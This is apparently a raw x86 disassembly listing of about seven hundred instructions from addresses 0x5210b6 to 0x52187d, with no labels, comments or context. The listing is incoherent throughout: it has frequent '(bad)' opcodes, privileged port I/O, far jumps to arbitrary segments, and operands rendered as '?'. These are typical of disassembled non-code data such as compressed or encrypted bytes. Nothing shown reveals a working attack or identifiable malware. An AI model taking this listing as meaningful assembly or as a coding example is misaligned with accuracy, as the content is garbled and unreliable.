  5210b6:	mov    edi,0x19c32abc
  5210bb:	add    eax,ecx
  5210bd:	ret    
  5210be:	dec    edx
  5210bf:	xchg   ebp,eax
  5210c0:	jb     0x521071
  5210c2:	in     eax,0x39
  5210c4:	mov    bh,0x86
  5210c6:	mov    eax,ds:0x996ffd51
  5210cb:	pop    eax
  5210cc:	add    eax,esp
  5210ce:	inc    ebx
  5210cf:	jge    0x5210f3
  5210d1:	enter  0x344b,0x2
  5210d5:	push   esi
  5210d6:	arpl   WORD PTR [ebp-0x25],ax
  5210d9:	mov    al,ds:0x59f4b912
  5210de:	jno    0x521138
  5210e0:	or     DWORD PTR [eax+esi*8+0x35],edi
  5210e4:	pop    ss
  5210e5:	mov    ah,0xf7
  5210e7:	and    al,0x7c
  5210e9:	jmp    0x2fdd:0xf9f18afc
  5210f0:	pop    edi
  5210f1:	arpl   dx,bp
  5210f3:	mov    ds:0x8a7bc50f,eax
  5210f8:	std    
  5210f9:	adc    al,BYTE PTR [eax+ebp*1+0x19]
  5210fd:	xchg   esi,eax
  5210fe:	push   eax
  5210ff:	arpl   WORD PTR [edx-0x4e81b147],dx
  521105:	push   edx
  521106:	cdq    
  521107:	sub    bh,BYTE PTR [ebp+ebx*8-0x14f8ea73]
  52110e:	sar    cl,0x78
  521111:	fdivr  DWORD PTR [esi+eiz*8+0x271ed0cf]
  521118:	rcr    BYTE PTR [esi+0x5b],0x2d
  52111c:	imul   ebp,DWORD PTR [eax+0x6e376c1a],0x36
  521123:	and    DWORD PTR [ebp-0x417431],ebp
  521129:	or     DWORD PTR [edi+ecx*4-0x65],ecx
  52112d:	int3   
  52112e:	cdq    
  52112f:	inc    edx
  521130:	mov    DWORD PTR [edi+0x11],esp
  521133:	dec    edi
  521134:	sub    eax,0x8106ed1a
  521139:	retf   0x6370
  52113c:	push   ds
  52113d:	(bad)  
  52113e:	popa   
  52113f:	(bad)  
  521140:	lods   al,BYTE PTR ds:[esi]
  521141:	sub    al,0x3
  521143:	and    DWORD PTR [esi],edi
  521145:	popf   
  521146:	inc    edi
  521147:	outs   dx,BYTE PTR ds:[esi]
  521148:	popa   
  521149:	popf   
  52114a:	test   BYTE PTR [edi+0x51],dl
  52114d:	jnp    0x521143
  52114f:	cdq    
  521150:	mov    dl,0xa0
  521152:	inc    edx
  521153:	js     0x521150
  521155:	scas   eax,DWORD PTR es:[edi]
  521156:	mov    bl,0xf1
  521158:	sbb    esp,DWORD PTR [ecx+0x2c]
  52115b:	xchg   edi,eax
  52115c:	(bad)  
  52115d:	sbb    eax,0xa7e1e309
  521162:	mov    esi,0x39cc87ad
  521167:	xor    eax,0x3045057c
  52116c:	pusha  
  52116d:	sbb    dl,ch
  52116f:	adc    DWORD PTR [esi+0x2c],0x59eb2615
  521176:	dec    edi
  521177:	fdivr  QWORD PTR [edi-0x3d837dd5]
  52117d:	jecxz  0x52117c
  52117f:	aam    0xe3
  521181:	cs add ebp,edx
  521184:	(bad)  
  521185:	xchg   edi,eax
  521186:	pop    ecx
  521187:	sub    ebx,ecx
  521189:	dec    esp
  52118a:	jge    0x5211ad
  52118c:	sub    dl,dl
  52118e:	add    al,0x3a
  521190:	xchg   esi,eax
  521191:	rcr    eax,0x90
  521194:	add    DWORD PTR [esi],eax
  521196:	add    ebp,edi
  521198:	(bad)  
  521199:	outs   dx,DWORD PTR ds:[esi]
  52119a:	stc    
  52119b:	pop    esp
  52119c:	retf   0x5e1e
  52119f:	out    dx,eax
  5211a0:	inc    esp
  5211a1:	mov    dl,0xcf
  5211a3:	xchg   DWORD PTR [ebp+0x2b],esp
  5211a6:	jbe    0x52115a
  5211a8:	or     ebp,ebp
  5211aa:	and    edi,ebp
  5211ac:	addr16 inc esp
  5211ae:	adc    al,0x28
  5211b0:	cmp    bh,ch
  5211b2:	lock out 0x64,eax
  5211b5:	cmc    
  5211b6:	jg     0x5211b5
  5211b8:	and    ebx,DWORD PTR ds:0x6af71859
  5211be:	jmp    0xcf63:0xef4b8e75
  5211c5:	dec    ebx
  5211c6:	cwde   
  5211c7:	xor    eax,0xfdee40aa
  5211cc:	lods   eax,DWORD PTR ds:[esi]
  5211cd:	pushf  
  5211ce:	inc    ebx
  5211cf:	dec    edx
  5211d0:	fwait
  5211d1:	je     0x5211b1
  5211d3:	and    esi,edx
  5211d5:	jo     0x5211f6
  5211d7:	xor    DWORD PTR [eax+eiz*4+0x5b],eax
  5211db:	cli    
  5211dc:	outs   dx,DWORD PTR ds:[esi]
  5211dd:	in     eax,dx
  5211de:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  5211df:	jmp    0x9efb3ce7
  5211e4:	pop    es
  5211e5:	sbb    DWORD PTR [eax-0x41],esp
  5211e8:	xchg   ecx,eax
  5211e9:	inc    esi
  5211ea:	rep stos DWORD PTR es:[edi],eax
  5211ec:	fwait
  5211ed:	cli    
  5211ee:	out    0x54,al
  5211f0:	jns    0x5211cf
  5211f2:	and    dl,BYTE PTR [esi+0x12]
  5211f5:	xor    edi,0x630df6d0
  5211fb:	loopne 0x521217
  5211fd:	ja     0x521215
  5211ff:	dec    esp
  521200:	mov    bh,0x81
  521202:	jmp    0x2633e0cb
  521207:	add    eax,0xdf76eacc
  52120c:	xchg   esi,eax
  52120d:	lahf   
  52120e:	dec    ecx
  52120f:	imul   esp,esi,0x7040ce61
  521215:	lock stos BYTE PTR es:[edi],al
  521217:	mov    ah,0x82
  521219:	mov    ds:0xc89c5bdd,al
  52121e:	repz iret 
  521220:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  521221:	das    
  521222:	fidiv  DWORD PTR fs:[edx-0x4e]
  521226:	add    DWORD PTR ds:0x39b8ee53,edi
  52122c:	xchg   edx,eax
  52122d:	nop
  52122e:	cmp    ebp,ecx
  521230:	cmp    esp,ebp
  521232:	mov    al,ds:0xa3ed513b
  521237:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  521238:	mov    ebx,0x151d0c30
  52123d:	fwait
  52123e:	sahf   
  52123f:	ss in  al,dx
  521241:	ins    DWORD PTR es:[edi],dx
  521242:	outs   dx,DWORD PTR ds:[esi]
  521243:	xchg   DWORD PTR [esi-0x619b6170],eax
  521249:	sti    
  52124a:	jo     0x5212a8
  52124c:	and    eax,0xc94c9bbb
  521251:	aaa    
  521252:	push   es
  521253:	div    DWORD PTR [ebp+ecx*2+0x757c931d]
  52125a:	ins    BYTE PTR es:[edi],dx
  52125b:	ds cld 
  52125d:	pop    ebp
  52125e:	sbb    BYTE PTR [edx-0x52],bh
  521261:	dec    esi
  521262:	mov    bh,0xfa
  521264:	dec    BYTE PTR [ebx-0x5f]
  521267:	jmp    0xbb1f:0xe20ef24
  52126e:	out    0xa2,al
  521270:	push   cs
  521271:	mov    WORD PTR [edx],fs
  521273:	adc    cl,BYTE PTR [eax]
  521275:	add    DWORD PTR [ecx],esi
  521277:	sbb    eax,0xffffff80
  52127a:	mov    ds:0xe61c4c0c,al
  52127f:	pop    esi
  521280:	test   al,0x38
  521282:	pop    esi
  521283:	sbb    eax,0xdcdc0069
  521288:	add    BYTE PTR [ebx+edi*8+0x4be08b4c],0xe2
  521290:	mul    cl
  521292:	(bad)  
  521294:	jne    0x521239
  521296:	mov    ecx,0xae915c03
  52129b:	leave  
  52129c:	xchg   ebp,eax
  52129d:	cmp    eax,0xe47b206d
  5212a2:	aad    0xa5
  5212a4:	jne    0x521234
  5212a6:	outs   dx,BYTE PTR ds:[esi]
  5212a7:	bound  ebp,QWORD PTR [esi-0xa]
  5212aa:	jmp    0x9b01fe9b
  5212af:	push   0x6341922e
  5212b4:	push   ss
  5212b5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  5212b6:	enter  0xb679,0xbb
  5212ba:	nop
  5212bb:	mov    bh,0x23
  5212bd:	mov    ebx,0x9f81b440
  5212c2:	mov    ebp,0x5bda0660
  5212c7:	or     eax,0xca39a45d
  5212cc:	and    BYTE PTR [esi+0xe],dh
  5212cf:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  5212d0:	adc    edx,0xffffffbf
  5212d3:	fmul   DWORD PTR [ebp-0x7a]
  5212d6:	or     BYTE PTR [eax],bh
  5212d8:	sub    dl,BYTE PTR [ebp+0x7b5b0cd8]
  5212de:	and    al,0xa1
  5212e0:	add    al,BYTE PTR [eax+0x31]
  5212e3:	stos   DWORD PTR es:[edi],eax
  5212e4:	sahf   
  5212e5:	lods   al,BYTE PTR ds:[esi]
  5212e6:	or     DWORD PTR [ebx+0x43],0xa615db87
  5212ed:	sub    ah,BYTE PTR [ebx+ecx*4]
  5212f0:	jp     0x521280
  5212f2:	cmp    DWORD PTR [esi],0x8f026cbb
  5212f8:	stos   BYTE PTR es:[edi],al
  5212f9:	push   esi
  5212fa:	dec    esi
  5212fb:	mov    ebp,0xdccd6bd3
  521300:	mov    DWORD PTR [eax+0x3b],eax
  521303:	add    ecx,DWORD PTR [ebx+0x61e073d4]
  521309:	ins    BYTE PTR es:[edi],dx
  52130a:	sbb    DWORD PTR [ecx+edx*8],eax
  52130d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  52130e:	pop    edx
  52130f:	cmp    BYTE PTR [edi],cl
  521311:	inc    esi
  521312:	bound  ebp,QWORD PTR [edi-0x7b742338]
  521318:	xchg   ebp,eax
  521319:	mov    esp,0x835b2ce6
  52131e:	cli    
  52131f:	retf   
  521320:	popf   
  521321:	popf   
  521322:	jmp    0x2833667e
  521327:	and    al,0x8c
  521329:	jp     0x52135b
  52132b:	shl    DWORD PTR [esi],cl
  52132d:	(bad)  
  52132e:	neg    BYTE PTR [ebx-0x6c6e0f43]
  521334:	enter  0xc58b,0xe1
  521338:	add    al,0xb1
  52133a:	cmp    edx,DWORD PTR [edx-0x34]
  52133d:	mov    bh,0xa4
  52133f:	xlat   BYTE PTR ds:[ebx]
  521340:	xlat   BYTE PTR ds:[ebx]
  521341:	call   0x4beb:0xd2dd8115
  521348:	js     0x521350
  52134a:	adc    al,0x77
  52134c:	popa   
  52134d:	cmc    
  52134e:	fidiv  WORD PTR [edx-0x6acd869d]
  521354:	cmp    esi,0x36
  521357:	pop    ebp
  521358:	mov    bl,0xdb
  52135a:	push   esi
  52135b:	add    DWORD PTR [edi-0x9],ecx
  52135e:	outs   dx,DWORD PTR ds:[esi]
  52135f:	sbb    eax,0xabba303f
  521364:	inc    ebp
  521365:	aas    
  521366:	in     eax,dx
  521367:	andps  xmm6,XMMWORD PTR [edi]
  52136a:	lods   eax,DWORD PTR ds:[esi]
  52136b:	and    al,0xa6
  52136d:	and    BYTE PTR [edi-0x756cefb4],0x5e
  521374:	stos   DWORD PTR es:[edi],eax
  521375:	push   ds
  521376:	inc    eax
  521377:	mov    WORD PTR [eax-0x1c],es
  52137a:	scas   eax,DWORD PTR es:[edi]
  52137b:	gs (bad) 
  52137d:	out    0x67,al
  52137f:	mov    ch,0x42
  521381:	(bad)  
  521382:	dec    ebp
  521383:	ins    BYTE PTR es:[edi],dx
  521384:	and    BYTE PTR [ebx+ebp*4-0x5b9ec6b3],ch
  52138b:	xlat   BYTE PTR ds:[ebx]
  52138c:	dec    edx
  52138d:	mov    edx,0x52bc574d
  521392:	mov    ah,0xc0
  521394:	push   ebx
  521395:	out    0x50,al
  521397:	xor    al,0xa3
  521399:	(bad)  
  52139a:	in     eax,0x3a
  52139c:	adc    eax,0x2b59039e
  5213a1:	ror    DWORD PTR [edx+0xc],cl
  5213a4:	nop
  5213a5:	stos   BYTE PTR es:[edi],al
  5213a6:	pop    ecx
  5213a7:	push   0xfd25535a
  5213ac:	sbb    edi,DWORD PTR [ebx+0x5e]
  5213af:	js     0x5213e1
  5213b1:	sar    BYTE PTR [edx+0x1a],cl
  5213b4:	outs   dx,BYTE PTR ds:[esi]
  5213b5:	lods   eax,DWORD PTR ds:[esi]
  5213b6:	jo     0x5213be
  5213b8:	or     cl,BYTE PTR [ebx]
  5213ba:	adc    BYTE PTR [eax+0x25],ah
  5213bd:	in     al,dx
  5213be:	cmp    eax,0x23607631
  5213c3:	fs popa 
  5213c5:	cmp    DWORD PTR ds:0x2c82aed6,edi
  5213cb:	dec    edi
  5213cc:	neg    ah
  5213ce:	xlat   BYTE PTR ds:[ebx]
  5213cf:	gs stc 
  5213d1:	loope  0x52142e
  5213d3:	pop    esp
  5213d4:	mov    ah,0xeb
  5213d6:	inc    eax
  5213d7:	push   esi
  5213d8:	jne    0x521438
  5213da:	(bad)  
  5213db:	mov    ds:0x3d1af49c,al
  5213e0:	and    dh,BYTE PTR [eax-0x27]
  5213e3:	rcl    DWORD PTR [edi+0x6b49327f],1
  5213e9:	rcr    DWORD PTR [ebx],cl
  5213eb:	mov    ch,0x3
  5213ed:	(bad)  
  5213ee:	(bad)  
  5213f0:	fmul   QWORD PTR [eax+edx*8]
  5213f3:	mov    WORD PTR [edx-0x56],cs
  5213f6:	mov    ebx,0xefd3f54e
  5213fb:	inc    ebp
  5213fc:	iret   
  5213fd:	push   ds
  5213fe:	jo     0x521475
  521400:	or     DWORD PTR [ebx],ebx
  521402:	or     eax,0x44cc4bd
  521407:	lock push ebx
  521409:	sbb    BYTE PTR [ecx-0x191db48f],ah
  52140f:	adc    DWORD PTR [eax+0x40],0x4d
  521413:	mov    ah,0x22
  521415:	mov    ah,0x5b
  521417:	imul   edi,DWORD PTR [ecx+0x10454d8],0x6535d785
  521421:	retf   0x3119
  521424:	ror    eax,1
  521426:	jl     0x5213e2
  521428:	je     0x521416
  52142a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  52142b:	dec    ecx
  52142c:	mov    cl,0x90
  52142e:	out    0xc,eax
  521430:	mov    eax,0x34809846
  521435:	cld    
  521436:	xchg   edx,eax
  521437:	or     al,0x8d
  521439:	aaa    
  52143a:	lods   eax,DWORD PTR ds:[esi]
  52143b:	ds adc ecx,esp
  52143e:	push   ss
  52143f:	mov    al,ds:0x9ee1f0ee
  521444:	sub    BYTE PTR [ebp+ebp*1-0x5181f602],0x49
  52144c:	lods   al,BYTE PTR ds:[esi]
  52144d:	inc    edx
  52144e:	xchg   esp,eax
  52144f:	repnz retf 
  521451:	cmp    edi,ebx
  521453:	scas   al,BYTE PTR es:[edi]
  521454:	mov    cl,0xa5
  521456:	outs   dx,DWORD PTR ds:[esi]
  521457:	wbinvd 
  521459:	cmp    BYTE PTR [eax+0x41],ch
  52145c:	fadd   QWORD PTR [esi]
  52145e:	(bad)  
  521460:	inc    ebp
  521461:	call   0x2e48:0x581482f5
  521468:	popf   
  521469:	dec    esp
  52146a:	fst    DWORD PTR [edx+0x6f]
  52146d:	or     ch,0x10
  521470:	(bad)  
  521471:	iret   
  521472:	lea    eax,[ebp-0x2e]
  521475:	mov    eax,ds:0x9cf15ab3
  52147a:	dec    esp
  52147b:	ins    DWORD PTR es:[edi],dx
  52147c:	mov    cl,0x53
  52147e:	mov    esi,0xb501e942
  521483:	inc    esp
  521484:	inc    esi
  521485:	pop    ss
  521486:	cmc    
  521487:	dec    ebx
  521488:	inc    eax
  521489:	jnp    0x52143f
  52148b:	mov    ds:0x1a33124f,eax
  521490:	int3   
  521491:	sbb    edi,DWORD PTR [ebp-0x7f718dc3]
  521497:	mov    eax,ds:0x28734cb2
  52149c:	mov    ebx,0x3175ff23
  5214a1:	icebp  
  5214a2:	das    
  5214a3:	leave  
  5214a4:	sub    al,0xfe
  5214a6:	out    0x60,eax
  5214a8:	or     al,0xe2
  5214aa:	aas    
  5214ab:	jb     0x52144c
  5214ad:	sbb    eax,0x37524ea0
  5214b2:	dec    ecx
  5214b3:	mov    ch,0xa
  5214b5:	mov    ds,WORD PTR [eax-0xcdb9c7]
  5214bb:	jae    0x52153c
  5214bd:	stos   DWORD PTR es:[edi],eax
  5214be:	jns    0x521503
  5214c0:	jmp    0xea11fabc
  5214c5:	and    eax,DWORD PTR [esi-0x6f7a1787]
  5214cb:	test   BYTE PTR [edi+0xd],dh
  5214ce:	test   eax,0x6778daf1
  5214d3:	push   ss
  5214d4:	mov    DWORD PTR [ecx+0x47],edx
  5214d7:	dec    edx
  5214d8:	lds    ecx,FWORD PTR [ebx+edi*4-0x1c67b36d]
  5214df:	bound  esi,QWORD PTR [esi-0x761e888b]
  5214e5:	xor    BYTE PTR ds:0xeb2274b4,0x3a
  5214ec:	test   al,ah
  5214ee:	test   DWORD PTR [edx+0x6f],0x764d289
  5214f5:	test   eax,0xd5dd9a1c
  5214fa:	inc    ebx
  5214fb:	mov    edi,0x32354f84
  521500:	pop    ebx
  521501:	out    dx,eax
  521502:	nop
  521503:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  521504:	dec    ecx
  521505:	rcl    BYTE PTR [edi-0x46],0x94
  521509:	clc    
  52150a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  52150b:	dec    esi
  52150c:	ret    0xaeb
  52150f:	cli    
  521510:	leave  
  521511:	jl     0x521544
  521513:	jne    0x521589
  521515:	popa   
  521516:	es adc dl,dl
  521519:	ret    0x3927
  52151c:	adc    ecx,eax
  52151e:	push   es
  52151f:	retf   0x822f
  521522:	aas    
  521523:	fcmovnb st,st(0)
  521525:	dec    ebp
  521526:	push   cs
  521527:	es ins BYTE PTR es:[edi],dx
  521529:	mov    eax,ds:0xa128460e
  52152e:	sub    DWORD PTR [esi+eiz*2+0x59776a9c],eax
  521535:	pop    edx
  521536:	dec    edx
  521537:	xor    al,0x51
  521539:	paddsb mm3,QWORD PTR ds:0x9672093c
  521540:	cmc    
  521541:	shr    DWORD PTR gs:[ebp+0x79],0x1c
  521546:	adc    eax,0x7851150e
  52154b:	std    
  52154c:	inc    esp
  52154d:	inc    eax
  52154e:	cdq    
  52154f:	cld    
  521550:	sahf   
  521551:	inc    esi
  521552:	dec    edx
  521553:	arpl   dx,di
  521555:	xchg   ecx,eax
  521556:	jp     0x521510
  521558:	inc    esi
  521559:	(bad)  
  52155a:	(bad)  
  52155b:	mov    edi,0x23ef82f9
  521560:	leave  
  521561:	loopne 0x52151b
  521563:	out    0x72,eax
  521565:	addr16 sti 
  521567:	xchg   ebx,eax
  521568:	sti    
  521569:	pop    ebx
  52156a:	sbb    eax,0x7606830c
  52156f:	sub    BYTE PTR [edx-0x1d639d24],0x45
  521576:	push   esp
  521577:	out    dx,al
  521578:	xchg   edi,eax
  521579:	xor    DWORD PTR [ecx+0x12],0xffffffad
  52157d:	pop    edx
  52157e:	mov    dl,0xe4
  521580:	enter  0x20ef,0x45
  521584:	test   BYTE PTR [eax-0x1a521fd8],bl
  52158a:	jp     0x52157e
  52158c:	addr16 aas 
  52158e:	in     eax,dx
  52158f:	mov    al,ds:0xa4c106e
  521594:	imul   esp,ebp,0xffffffe7
  521597:	aad    0x79
  521599:	inc    ebp
  52159a:	dec    DWORD PTR [ecx+0x7589b8]
  5215a0:	or     dl,BYTE PTR [ecx+esi*4+0x2a]
  5215a4:	and    DWORD PTR [esi-0x2f4b5773],edi
  5215aa:	mov    bh,0xb1
  5215ac:	and    al,0x34
  5215ae:	enter  0xf9fc,0x8e
  5215b2:	dec    eax
  5215b3:	push   ebp
  5215b4:	pop    edx
  5215b5:	ja     0x52155e
  5215b7:	in     eax,dx
  5215b8:	push   ds
  5215b9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  5215ba:	fcom   st(7)
  5215bc:	mov    edx,0xb02bb9ea
  5215c1:	dec    ebp
  5215c2:	sub    al,0xe8
  5215c4:	mov    ch,0xa8
  5215c6:	xadd   DWORD PTR [eax],ebp
  5215c9:	inc    edx
  5215ca:	mov    cl,0xab
  5215cc:	pop    es
  5215cd:	ss jne 0x521570
  5215d0:	mov    ds:0xe0156b31,al
  5215d5:	out    dx,eax
  5215d6:	adc    al,0x15
  5215d8:	stos   DWORD PTR es:[edi],eax
  5215d9:	add    bl,dl
  5215db:	lods   al,BYTE PTR ds:[esi]
  5215dc:	jge    0x521576
  5215de:	and    ebx,DWORD PTR [edi-0x1]
  5215e1:	mov    ebp,0x91f5001e
  5215e6:	xor    eax,0xe3384336
  5215eb:	fsub   DWORD PTR [edi+0x37]
  5215ee:	and    ecx,DWORD PTR [ebp-0x2c]
  5215f1:	(bad)  
  5215f2:	popf   
  5215f3:	popf   
  5215f4:	out    0x97,al
  5215f6:	or     ebp,DWORD PTR [esi-0x42]
  5215f9:	xchg   BYTE PTR [ebx+edi*4+0x12],dl
  5215fd:	aaa    
  5215fe:	cmp    bh,ah
  521600:	or     DWORD PTR [esi+0x3fc16f15],esp
  521606:	mov    edx,0x2a70a557
  52160b:	or     BYTE PTR [esp+ecx*8+0x3f6c38ea],ah
  521612:	fadd   QWORD PTR [edx]
  521614:	idiv   BYTE PTR [ecx+0x78dd5f0b]
  52161a:	lods   eax,DWORD PTR ds:[esi]
  52161b:	mov    WORD PTR [esi],ss
  52161d:	addr16 aad 0x61
  521620:	call   0x971c9f03
  521625:	add    esi,DWORD PTR [ebp+edi*4-0x14]
  521629:	outs   dx,BYTE PTR ds:[esi]
  52162a:	fdivr  DWORD PTR [edi]
  52162c:	mov    bh,0xca
  52162e:	jle    0x5215f0
  521630:	bound  esp,QWORD PTR [edi+ecx*4]
  521633:	std    
  521634:	jae    0x521633
  521636:	pusha  
  521637:	and    DWORD PTR [ecx+0x2b022148],esi
  52163d:	into   
  52163e:	push   ds
  52163f:	clc    
  521640:	sahf   
  521641:	push   ecx
  521642:	scas   eax,DWORD PTR es:[edi]
  521643:	clc    
  521644:	mov    WORD PTR [edx+edi*1],es
  521647:	stc    
  521648:	cdq    
  521649:	aam    0x83
  52164b:	nop
  52164c:	xchg   esp,eax
  52164d:	pop    esp
  52164e:	xchg   edi,eax
  52164f:	pusha  
  521650:	icebp  
  521651:	inc    ebp
  521652:	in     al,0xc5
  521654:	xchg   esp,eax
  521655:	retf   
  521656:	(bad)  
  521657:	jbe    0x5216a4
  521659:	scas   al,BYTE PTR es:[edi]
  52165a:	sub    DWORD PTR [eax],edi
  52165c:	cli    
  52165d:	std    
  52165e:	lods   eax,DWORD PTR ds:[esi]
  52165f:	cwde   
  521660:	pop    edi
  521661:	out    dx,al
  521662:	repz pop ds
  521664:	lock (bad) 
  521666:	gs scas eax,DWORD PTR es:[edi]
  521668:	push   ds
  521669:	dec    edx
  52166a:	push   ds
  52166b:	push   0x3391629e
  521670:	and    al,0x88
  521672:	and    ch,BYTE PTR [edi]
  521674:	or     dl,BYTE PTR [ebx+0x6e]
  521677:	sbb    al,0x3
  521679:	fstp   QWORD PTR [eax]
  52167b:	or     ebp,DWORD PTR ds:0x4acb674
  521681:	(bad)  ds:0x973f423e
  521687:	(bad)  
  521688:	push   0x15
  52168a:	mov    cl,0xb8
  52168c:	or     al,0xa9
  52168e:	dec    ecx
  52168f:	sbb    cl,BYTE PTR [ebx+ecx*2]
  521692:	out    0xe8,eax
  521694:	and    al,0x29
  521696:	test   al,0x10
  521698:	inc    esp
  521699:	sub    DWORD PTR [ecx+0x288fa756],0x77672845
  5216a3:	jo     0x5216e5
  5216a5:	mov    ecx,0xbd7589c6
  5216aa:	mov    dh,0x6f
  5216ac:	jne    0x5216b6
  5216ae:	add    ah,BYTE PTR [edx+0x25448957]
  5216b4:	and    dh,0x92
  5216b7:	inc    eax
  5216b8:	stc    
  5216b9:	dec    ecx
  5216ba:	cld    
  5216bb:	fstp   DWORD PTR [edx-0x2947e92]
  5216c1:	test   al,0x96
  5216c3:	cmp    BYTE PTR [ebx+eiz*4-0x26],al
  5216c7:	pusha  
  5216c8:	ins    BYTE PTR es:[edi],dx
  5216c9:	xor    al,0xec
  5216cb:	shl    edi,0xf4
  5216ce:	ror    DWORD PTR [ebx],cl
  5216d0:	div    BYTE PTR [ecx-0x36]
  5216d3:	and    eax,DWORD PTR [ebp+0xdeddf8a]
  5216d9:	dec    edx
  5216da:	dec    esi
  5216db:	dec    eax
  5216dc:	adc    eax,0xcd65c14a
  5216e1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  5216e2:	mul    DWORD PTR [eax]
  5216e4:	mov    esi,DWORD PTR [esi-0x3b]
  5216e7:	inc    edx
  5216e8:	inc    eax
  5216e9:	mov    ecx,0xcb8a2807
  5216ee:	repnz mov cl,BYTE PTR [esi-0x47]
  5216f2:	push   cs
  5216f3:	cmp    ebp,DWORD PTR [edx+0x4e]
  5216f6:	jp     0x5216f3
  5216f8:	jns    0x5216b6
  5216fa:	sbb    dh,al
  5216fc:	push   es
  5216fd:	mov    ebx,0xfee47bee
  521702:	cdq    
  521703:	jae    0x521775
  521705:	(bad)  
  521706:	hlt    
  521707:	mov    BYTE PTR [eax+0x5a],0x69
  52170b:	mov    edi,0x2b8d1dee
  521710:	ret    0x57c6
  521713:	push   ebx
  521714:	add    DWORD PTR [ecx],eax
  521716:	je     0x5216d1
  521718:	sub    dl,ch
  52171a:	mov    ?,WORD PTR [ecx+ecx*4-0x65049936]
  521721:	bound  ecx,QWORD PTR [edi+0x43f1f27c]
  521727:	loopne 0x521798
  521729:	jae    0x521794
  52172b:	test   eax,0x6538d313
  521730:	std    
  521731:	aaa    
  521732:	test   eax,0xbcb0dbdb
  521737:	and    edi,eax
  521739:	inc    ebx
  52173a:	xchg   esi,eax
  52173b:	push   0x59
  52173d:	int3   
  52173e:	inc    esi
  52173f:	cmp    BYTE PTR [edx+ebx*8+0x27e767d6],dl
  521746:	sbb    cl,BYTE PTR [edi+0x50fa198b]
  52174c:	and    bh,ah
  52174e:	add    al,0x96
  521750:	adc    DWORD PTR [ecx-0x5b00280b],0x337ed44c
  52175a:	jmp    0x78c4:0xbb7ebd12
  521761:	sti    
  521762:	mov    edx,0x15f6364
  521767:	aaa    
  521768:	sub    ah,BYTE PTR [esi+0x3342d581]
  52176e:	push   cs
  52176f:	call   0xa231cf3
  521774:	call   0xe1dbb0f9
  521779:	mov    WORD PTR [eax],?
  52177b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  52177c:	or     al,0x71
  52177e:	adc    ecx,DWORD PTR [edi]
  521780:	pop    esi
  521781:	xchg   BYTE PTR [ebx+0x6c5ad7c2],bh
  521787:	popf   
  521788:	xacquire xchg BYTE PTR [edx+eiz*1-0x7e],dh
  52178d:	mov    dh,0x14
  52178f:	xchg   ecx,eax
  521790:	cwde   
  521791:	call   0x6b22483a
  521796:	and    DWORD PTR [edi-0x46e78543],0x73
  52179d:	xor    eax,0x9d836764
  5217a2:	pop    ds
  5217a3:	jg     0x5217aa
  5217a5:	imul   BYTE PTR [ebx]
  5217a7:	outs   dx,BYTE PTR ds:[esi]
  5217a8:	popa   
  5217a9:	xor    BYTE PTR [ebx-0x4c],ch
  5217ac:	jge    0x521819
  5217ae:	and    DWORD PTR [eax-0x2c751db1],0x50
  5217b5:	push   ebp
  5217b6:	stc    
  5217b7:	mov    ds:0xf41ad8b9,eax
  5217bc:	popf   
  5217bd:	js     0x52181a
  5217bf:	add    DWORD PTR [ebx-0x1a],eax
  5217c2:	pop    ss
  5217c3:	and    eax,0xa49e97a
  5217c8:	fimul  WORD PTR gs:[eax+0x2b]
  5217cc:	(bad)  
  5217cd:	xor    eax,DWORD PTR [edi+ebp*4-0x29df5b91]
  5217d4:	xor    dl,dh
  5217d6:	shl    edi,cl
  5217d8:	clc    
  5217d9:	jmp    0x10d28480
  5217de:	sub    dl,al
  5217e0:	sub    DWORD PTR [edx+0xa],0xf80a6cff
  5217e7:	enter  0x4b1,0x6
  5217eb:	bound  ecx,QWORD PTR [ebp-0x1b71f110]
  5217f1:	sbb    DWORD PTR ss:[ecx-0x66afa78d],esp
  5217f8:	add    ah,BYTE PTR ds:0x8ce42120
  5217fe:	xchg   BYTE PTR [edi-0x511baf02],ch
  521804:	lods   eax,DWORD PTR ds:[esi]
  521805:	jge    0x521831
  521807:	xchg   esp,eax
  521808:	je     0x5217ef
  52180a:	mov    ebx,0x2f6a91b2
  52180f:	daa    
  521810:	xchg   ecx,eax
  521811:	xchg   esp,eax
  521812:	push   0xffffffc9
  521814:	mov    edx,0xfe75bb2e
  521819:	test   al,0x6e
  52181b:	ss ja  0x521813
  52181e:	jnp    0x52184b
  521820:	sub    eax,0xa40ce9b1
  521825:	dec    ebp
  521826:	popa   
  521827:	sbb    ebx,DWORD PTR [eax-0x3d]
  52182a:	cmp    eax,0x48c7175f
  52182f:	push   esi
  521830:	gs sbb dh,cl
  521833:	xchg   edx,eax
  521834:	inc    ebx
  521835:	mov    bh,0x6a
  521837:	cwde   
  521838:	fld    TBYTE PTR cs:[edx]
  52183b:	je     0x5217cc
  52183d:	out    dx,al
  52183e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  52183f:	aam    0x7e
  521841:	lods   eax,DWORD PTR ds:[esi]
  521842:	int3   
  521843:	into   
  521844:	inc    edi
  521845:	aas    
  521846:	pop    esi
  521847:	inc    esp
  521848:	fucompp 
  52184a:	jnp    0x5218b3
  52184c:	jecxz  0x5217f5
  52184e:	fmulp  st(2),st
  521850:	stc    
  521851:	pop    esp
  521852:	icebp  
  521853:	dec    eax
  521854:	ror    BYTE PTR ds:0x9585a10c,cl
  52185a:	jg     0x5218b1
  52185c:	mov    ds,WORD PTR [ebx+ebp*2+0x16]
  521860:	cmc    
  521861:	icebp  
  521862:	push   ecx
  521863:	je     0x52181c
  521865:	dec    esp
  521866:	dec    eax
  521867:	pusha  
  521868:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  521869:	sti    
  52186a:	icebp  
  52186b:	cmp    al,0x92
  52186d:	mov    edi,ebx
  52186f:	cwde   
  521870:	test   eax,0x7c4143cb
  521875:	in     eax,0x33
  521877:	dec    DWORD PTR [ecx-0x64d750f6]
  52187d:	xor    ebp,DWORD PTR [ecx+eiz*8]
